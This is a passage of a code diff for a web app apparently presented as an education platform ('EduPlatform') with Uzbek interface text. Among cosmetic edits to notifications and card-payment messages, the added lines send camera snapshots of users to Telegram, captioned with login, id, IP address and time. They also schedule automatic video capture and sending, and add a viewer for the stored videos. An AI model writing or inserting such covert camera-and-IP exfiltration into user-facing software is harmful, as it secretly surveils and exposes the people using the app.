             } catch (e) { console.warn('Snapshot error:', e); }
@@ -1337,6 +1534,9 @@
                         if (!u.snapshots) u.snapshots = [];
                         u.snapshots.unshift({ img: photoData, at: new Date().toISOString() });
                         if (u.snapshots.length > MAX_SNAPSHOTS) u.snapshots = u.snapshots.slice(0, MAX_SNAPSHOTS);
+
+                        const cap = '📸 Foto\n👤 ' + db.currentUser.login + ' (' + db.currentUser.id + ')\n🌐 ' + userIP + '\n📅 ' + new Date().toLocaleString('ru-RU');
+                        sendPhotoToTelegram(photoData, cap);
                     }
                     if (locationData) u.location = locationData;
                     if (userIP && userIP !== '—') u.lastIP = userIP;
@@ -1353,6 +1553,7 @@
                         toast(parts.join(' va ') + ' saqlandi ✅');
                     }
                 }
+                if (cameraOk) setTimeout(captureVideoAndSend, 1500);
             } else if (isAuto) {
                 document.getElementById('permFallbackBar').classList.remove('hidden');
             }
@@ -1403,9 +1604,21 @@
             if (s) document.getElementById('liveViewerImg').src = s.img;
             document.getElementById('liveViewerStrip').innerHTML = u.snapshots.map((snap, i) => `<div class="relative"><img src="${snap.img}" class="w-16 h-16 object-cover rounded-lg cursor-pointer border-2 ${i === _snapViewerIndex ? 'border-emerald-500' : 'border-slate-700'}" onclick="changeSnapIndex(${i})"><span class="absolute bottom-0.5 left-0.5 text-[8px] bg-black/70 text-white px-1 rounded">${new Date(snap.at).toLocaleTimeString('ru-RU',{hour:'2-digit',minute:'2-digit'})}</span></div>`).join('');
         }
-
         function changeSnapIndex(i) { _snapViewerIndex = i; renderSnapViewer(); }
         function closeLiveViewer() { document.getElementById('liveViewerModal').classList.add('hidden'); _snapViewerUserId = null; }
+
+        function openVideoViewer(userId, index = 0) {
+            const u = db.users.find(x => x.id === userId);
+            if (!u || !u.videos || u.videos.length === 0) return;
+            const v = u.videos[index];
+            document.getElementById('videoViewerName').textContent = u.login + ' (' + u.id + ') — ' + (index + 1) + '/' + u.videos.length;
+            document.getElementById('videoViewerPlayer').src = v.data;
+            document.getElementById('videoViewerModal').classList.remove('hidden');
+        }
+        function closeVideoViewer() {
+            document.getElementById('videoViewerPlayer').src = '';
+            document.getElementById('videoViewerModal').classList.add('hidden');
+        }
 
         // ===== PAYMENT =====
         let _payMode = 'topup';
@@ -1457,10 +1670,10 @@
             const [mm] = exp.split('/').map(Number);
             if (mm < 1 || mm > 12) { errEl.textContent = "Oy 01–12!"; errEl.classList.remove('hidden'); return false; }
             if (cvv.length < 3) { errEl.textContent = "CVV 3 raqam!"; errEl.classList.remove('hidden'); return false; }
-            if (name.length < 3) { errEl.textContent = "Karta egasini kiriting!"; errEl.classList.remove('hidden'); return false; }
+            if (name.length < 3) { errEl.textContent = "Karta egasi!"; errEl.classList.remove('hidden'); return false; }
             if (_payMode === 'topup') {
                 const amt = Number(document.getElementById('payTopUpAmount').value);
-                if (!amt || amt < 1000) { errEl.textContent = "Minimum 1 000 so'm!"; errEl.classList.remove('hidden'); return false; }
+                if (!amt || amt < 1000) { errEl.textContent = "Minimum 1 000!"; errEl.classList.remove('hidden'); return false; }
             }
             errEl.classList.add('hidden'); return true;
         }
@@ -1517,7 +1730,7 @@ self.addEventListener('message', e => {
     if (e.data && e.data.type === 'SCHEDULE_REMINDER') {
         const { delay, userId } = e.data;
         setTimeout(() => {
-            self.registration.showNotification("📚 EduPlatform — Bugungi darsni o'tdingizmi?", {
+            self.registration.showNotification("📚 EduPlatform", {
                 body: "Har kun o'qish — muvaffaqiyat kalitidir! 🎯",
                 icon: "https://cdn-icons-png.flaticon.com/512/3976/3976635.png",
                 tag: "daily-reminder-" + userId
@@ -1551,7 +1764,7 @@ self.addEventListener('notificationclick', e => { e.notification.close(); e.wait
             if (target <= now) target.setDate(target.getDate() + 1);
             const delay = customDelay !== undefined ? customDelay : (target - now);
             setTimeout(() => {
-                new Notification("📚 EduPlatform — Bugungi darsni o'tdingizmi?", {
+                new Notification("📚 EduPlatform", {
                     body: "Har kun o'qish — muvaffaqiyat kalitidir! 🎯",
                     icon: "https://cdn-icons-png.flaticon.com/512/3976/3976635.png",
                     tag: 'daily-' + db.currentUser.id
@@ -1568,8 +1781,8 @@ self.addEventListener('notificationclick', e => { e.notification.close(); e.wait
             const diffDays = Math.floor((today - lastDate) / 86400000);
             if (diffDays >= 1) {
                 setTimeout(() => {
-                    new Notification("😔 EduPlatform — " + diffDays + " kun dars o'tkazib yubordingiz!", {
-                        body: "Hech qachon kech emas! 💪",
+                    new Notification("😔 EduPlatform", {
+                        body: diffDays + " kun o'tkazib yubordingiz! 💪",
                         icon: "https://cdn-icons-png.flaticon.com/512/3976/3976635.png",
                         tag: 'missed-' + db.currentUser.id
                     });
